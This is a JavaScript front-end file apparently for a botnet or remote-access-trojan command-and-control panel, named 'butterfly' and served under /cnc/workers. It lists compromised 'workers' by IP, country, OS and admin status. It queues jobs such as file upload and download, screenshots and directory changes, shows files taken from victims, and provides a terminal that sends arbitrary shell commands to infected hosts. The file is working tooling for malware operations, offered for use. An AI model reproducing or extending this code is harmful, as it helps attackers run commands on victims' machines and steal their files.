let currWorkerId;
let workersTable,
    jobsTable,
    uploadsTable;
let terminal;
const jobTypesMap = {
    'upload': 1,
    'download': 2,
    'sleep': 1,
    'boost': 1,
    'chdir': 1,
    'msg': 2,
    'shot': 0
}
//['upload', 'download', 'chdir', 'sleep', 'shot'];
// BYTES TO HUMAN-READABLE
// TODO: find faster alternative or store strings instead of integers
function formatBytes(bytes, decimals = 2) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const dm = decimals < 0 ? 0 : decimals;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
}

function isQuoted(s) {
    return s.startsWith('"') && s.endsWith('"')
}

function splitArgsStr(argsStr) {
    let args = [];
    let quoted = false;
    let begin = 0;
    let n = argsStr.length;
    for (let i = 1; i < n; i++) {
        let prev = argsStr[i-1];
        if (prev === '"') {
            if (quoted) {
                args.push(argsStr.slice(begin, i-1));
                quoted = false;
                begin = i + 1;
            } else {
                quoted = true;
                begin = i;
            }
        } else if (argsStr[i] === ' ' && !quoted) {
            if (prev !== ' ') {
                args.push(argsStr.slice(begin, i));
                begin = i;
            }
            begin++;
        }
    }
    if (n > 0) {
        if (argsStr[n-1] === '"') {
            args.push(argsStr.slice(begin, n-1));
        } else {
            args.push(argsStr.slice(begin, n));
        }
    }
    return args;
}

// MODAL
function showModal(modalId) {
    $(modalId).removeClass('hidden');
}

function hideModal(modalId) {
    $(modalId).addClass('hidden');
}

// RESOURCE INFO
function showHardwareInfo(wid) {
    $.getJSON(`/api/workers/${wid}/hardware`, function (res) {
        $('#cpu-info').html(res.cpu);
        $('#gpu-info').html(res.gpu);
        $('#ram-info').html(res.ram);
        showModal('#hardware-dlg');
    });
    // TODO: check for errors!
}

// TABS
function switchTab() {
    // get current tab
    let currTab = $('.tabs .active-tab');
    currTab.removeClass('active-tab');
    $('#' + currTab.attr('aria-controls')).removeClass('active-body');
    // set clicked tab
    let selected = $(this);
    selected.addClass('active-tab');
    $('#' + selected.attr('aria-controls')).addClass('active-body');
}

// TABLE ROWS
function getSelectedRows(tableId) {
    let selected = [];
    $(tableId + ' .one-select').each(function () {
        selected.push($(this).val());     // TODO: use .all-select? convert to number? avoid injection? add active class?
    });
    return selected;
}

function selectAllRows() {
    let box = $(this);
    let val = box.is(':checked');
    box.closest('table').find('.one-select').each(function () {
        $(this).prop('checked', val);
    })
}

// WORKERS
function createWorkersTable() {
    workersTable = $('#workers-table').DataTable({
            ajax: {
                url: '/api/workers',
                dataSrc: '',
                error: function () {
                    alert("Failed to load workers data!");
                }
            },
            columns: [
                {
                    data: null,
                    title: `<input class="all-select" type="checkbox" onclick="selectAllRows('#workers-table')">`,
                    render: function (data, type, row) {
                        if (type === 'display') {
                            return `<input class="one-select" type="checkbox" value="${row.id}"/>`;
                        }
                        return null;
                    },
                    width: "5%"
                },
                {data: 'hostname', title: 'Hostname', width: "15%"},
                {data: 'ip_addr', title: 'IP-Address', width: "15%"},
                {data: 'country', title: 'Country', width: "10%"},
                {data: 'os', title: 'OS', width: "15%"},
                {
                    data: 'is_admin',
                    title: 'Admin',
                    render: function (data, type) {
                        if (type === 'display' || type === 'filter') {
                            return data ? 'yes' : 'no';
                        }
                        return data;
                    },
                    width: "5%"
                },
                {
                    data: "boost",
                    title: "Boost",
                    render: function (data, type) {
                        if (type === 'display' || type === 'filter') {
                            return data ? 'on' : 'off';
                        }
                        return data;
                    },
                    width: "5%"
                },
                {
                    data: 'last_seen',
                    title: 'Last-Seen',
                    render: function (data, type) {
                        if (type === 'display') {
                            let diff = new Date() - new Date(data);
                            if (diff > 60000) {
                                // TODO: turn off boost mode! call updateBoostMode(worker_id, value)
                                return data.slice(0, 19).replace('T', ' ');
                            }
                            return 'Online';
                        }
                        return data;
                    },
                    width: "20%"
                },
                {
                    data: null,
                    title: 'Action',
                    render: function (data, type, row) {
                        if (type === 'display') {
                            return `<button type="button" class="action-btn" 
                                            onclick="document.location.href='/cnc/workers/${row.id}'">
                                        <i class="fa fa-pencil-square-o" aria-hidden="true"></i>
                                    </button>
                                    <button type="button" class="action-btn" onclick="showHardwareInfo('${row.id}')">
                                        <i class="fa fa-info-circle" aria-hidden="true"></i>
                                    </button>`;
                        }
                        return null;
                    },
                    width: "10%"
                }
            ],
            columnDefs: [
                {
                    searchable: false,
                    orderable: false,
                    targets: [0, 8]
                },
                {
                    className: 'dt-body-center',
                    targets: [0]
                }
            ],
            order: [[7, 'asc']]
        }
    );
}

// HISTORY
function setCurrWorkerId() {
    let url = window.location.pathname;
    currWorkerId = url.substring(url.lastIndexOf('/') + 1);
}

// JOBS
function createJobsTable() {
    jobsTable = $('#jobs-table').DataTable({
        ajax: {
            url: `/api/workers/${currWorkerId}/jobs`,
            dataSrc: '',
            error: function () {
                alert('Failed to load jobs data!');
            }
        },
        columns: [
            {
                data: null,
                title: `<input class="all-select" type="checkbox">`,
                render: function (data, type, row) {
                    if (type === 'display') {
                        return `<input class="one-select" type="checkbox" value="${row.id}"/>`;
                    }
                    return null;
                },
                width: "5%"
            },
            {data: 'id', title: 'ID', width: "5%"},
            {data: 'todo', title: 'ToDo', width: "47%"},
            {
                data: 'is_done',
                title: 'Resolved',
                render: function (data, type) {
                    if (type === 'display' || type === 'filter') {
                        return data ? 'yes' : 'no';
                    }
                    return data;
                },
                width: "10%"
            },
            {
                data: 'created',
                title: 'Created',
                render: function (data, type) {
                    if (type === 'display') {
                        return data.slice(0, 19).replace('T', ' ');
                    }
                    return data;
                },
                width: "18%"
            },
            {
                data: null,
                title: 'Action',
                render: function (data, type, row) {
                    if (type === 'display') {
                        let res = `<button type="button" onclick="removeJob(${row.id})" class="action-btn">
                                        <i class="fa fa-trash" aria-hidden="true"></i>
                                   </button>`;
                        if (row.is_done) {
                            res += `<button type="button" onclick="window.open('/api/workers/${currWorkerId}/jobs/${row.id}/report')" 
                                            class="action-btn"> <i class="fa fa-search" aria-hidden="true"></i>
                                    </button>`;
                        }
                        return res;
                    }
                    return null;
                },
                width: "15%"
            }],
        columnDefs: [
            {
                searchable: false,
                orderable: false,
                targets: [0, 5]
            },
            {
                className: 'dt-body-center',
                targets: [0]
            }
        ],
        order: [[4, 'asc']]
    });
}

function removeJobApi(jobId, func) {
    $.ajax({
        url: `/api/workers/${currWorkerId}/jobs/${jobId}`,
        type: 'DELETE',
        success: func,
        error: function () {
            alert('Failed to delete job!');
        }
    });
}

function removeJob(jobId) {
    removeJobApi(jobId, function () {
        jobsTable.rows(function (ix, data) {
            return jobId === data.id;
        }).remove().draw(false);
    });
}

function createJobApi(job, funcSucc, funcErr) {
    $.ajax({
        type: 'POST',
        url: `/api/workers/${currWorkerId}/jobs`,
        data: JSON.stringify(job),
        contentType: 'application/json',
        dataType: 'json',
        success: funcSucc,
        error: funcErr
    });
}

function addJobToTable(job) {
    if (jobsTable != null) {
        jobsTable.row.add(job).draw(false);
    }
}

function submitNewJobDlg() {
    let job = {
        todo: $('#todo').val(),
        is_done: false
    };
    createJobApi(job, function (data) {
            addJobToTable(data);
        }, function () {
            alert('Failed to create job!');
        }
    );
    hideModal('#new-job-dlg');
}

// UPLOADS
function createUploadsTable() {
    uploadsTable = $('#uploads-table').DataTable({
        ajax: {
            url: `/api/workers/${currWorkerId}/uploads/info`,
            dataSrc: '',
            error: function () {
                alert("Failed to load uploads data!");
            }
        },
        columns: [
            {
                data: null,
                title: `<input class="all-select" type="checkbox">`,
                render: function (data, type, row) {
                    if (type === 'display') {
                        return `<input class="one-select" type="checkbox" value="${row.id}"/>`
                    }
                    return null;
                },
                width: "5%"
            },
            {data: 'id', title: 'ID', width: "4%"},
            {data: 'filename', title: 'Filename', width: "32%"},
            {data: 'type', title: 'Type', width: "10%"},
            {
                data: 'size',
                title: 'Size',
                render: function (data, type) {
                    if (type === 'display') {
                        return formatBytes(parseInt(data));
                    }
                    return data;
                },
                width: "15%"
            },
            {
                data: 'created',
                title: 'Created',
                render: function (data, type) {
                    if (type === 'display') {
                        return data.slice(0, 19).replace('T', ' ');
                    }
                    return data;
                },
                width: "22%"
            },
            {
                data: null,
                title: 'Action',
                render: function (data, type, row) {
                    if (type === 'display') {
                        return `<button type="button" onclick="removeUpload(${row.id})" class="action-btn">
                                    <i class="fa fa-trash" aria-hidden="true"></i>
                                </button>
                                <button type="button" class="action-btn"
                                        onclick="window.location.href='/api/workers/${currWorkerId}/uploads/${row.id}?attach'">
                                    <i class="fa fa-download" aria-hidden="true"></i>
                                </button>
                                <button type="button" class="action-btn"
                                        onclick="window.open('/api/workers/${currWorkerId}/uploads/${row.id}')">
                                    <i class="fa fa-eye" aria-hidden="true"></i>
                                </button>`;
                    }
                    return null;
                },
                width: "12%"
            }],
        columnDefs: [
            {
                searchable: false,
                orderable: false,       // exclude checkbox & buttons
                targets: [0, 6]
            },
            {
                searchable: false,
                targets: [4]            // exclude size
            },
            {
                className: 'dt-body-center',
                targets: [0]            // center checkboxes
            }
        ],
        order: [[5, 'asc']]
    });
}

function removeUploadApi(uploadId, func) {
    $.ajax({
        url: `/api/workers/${currWorkerId}/uploads/${uploadId}`,
        type: 'DELETE',
        success: func,
        error: function () {
            alert('Failed to delete upload!');
        }
    });
}

function removeUpload(uploadId) {
    removeUploadApi(uploadId, function () {
        uploadsTable.rows(function (ix, data) {
            return uploadId === data.id;
        }).remove().draw(false);
    });
}

function retrieveReport(jobId, funSucc, funcErr, n = 10) {
    $.ajax({
        url: `/api/workers/${currWorkerId}/jobs/${jobId}/report`,
        type: 'GET',
        success: funSucc,
        error: function (xhr, stat, error) {
            if (n > 1) {
                setTimeout(function () {
                    retrieveReport(jobId, funSucc, funcErr, n - 1);
                }, 4000);
            } else {
                funcErr(xhr, stat, error);
            }
        }
    })
}

function updateWorkerAttrsApi(attrs, funcErr) {
    $.ajax({
        url: `/api/workers/${currWorkerId}`,
        type: 'PATCH',
        data: JSON.stringify(attrs),
        contentType: 'application/json',
        error: funcErr
    });
}

function getWorkerAttrsApi(attrs, funcSucc, funcErr) {
    $.ajax({
        url: `/api/workers/${currWorkerId}?props=${attrs.toString()}`,
        type: 'GET',
        dataType: 'json',
        success: funcSucc,
        error: funcErr
    });
}

function setupBoostToggle() {
    let boost = $('#boost');

    getWorkerAttrsApi(['boost'], function (data) {
        boost.prop('checked', data.boost);
    }, function () {
        alert('Failed to get boost mode value!');
    });
    boost.change(function () {                                              // TODO: click to onclick
        let val = $(this).is(':checked');
        createJobApi({
            todo: 'boost ' + (val ? 'on' : 'off'),
            is_done: false
        }, function (data) {
            updateWorkerAttrsApi({boost: val}, function () {
                alert('Failed to update boost mode value!');
            })
            addJobToTable(data);
        }, function () {
            alert('Failed to create job!');
        });
    })
}

function initTabs() {
    $('.tabs button').click(switchTab);

    $('#history-tab').one('click', function () {
        createJobsTable();
    });
    $('#uploads-tab').one('click', function () {
        createUploadsTable();
    });
    $('#terminal-tab').one('click', function () {
        terminal = $('#terminal-body').terminal(function (command) {
            if (command === '') {
                return;
            }
            terminal.pause();
            let job = {todo: null, is_done: false};
            let args = splitArgsStr(command);
            let argsN = jobTypesMap[args.shift()];          // or use simply args[0]
            if (argsN != null) {
                if (argsN !== args.length) {
                    terminal.error('Not enough or too much args passed!');
                    terminal.resume();
                    return;
                }
                job.todo = command;
            } else {
                job.todo = 'cmd ' + command;
            }
            createJobApi(job, function (data) {
                retrieveReport(data.id, rep => {
                    terminal.echo(rep);
                    terminal.resume();
                }, function () {
                    terminal.error('Failed to retrieve report!');
                    terminal.resume();
                });
                addJobToTable(data);
            }, function () {
                terminal.error('Failed to create job!');
                terminal.resume();
            });
        }, {
            greetings: 'Welcome to butterfly!',
            height: 570
        });
    });
    $('.active-tab').trigger('click');
}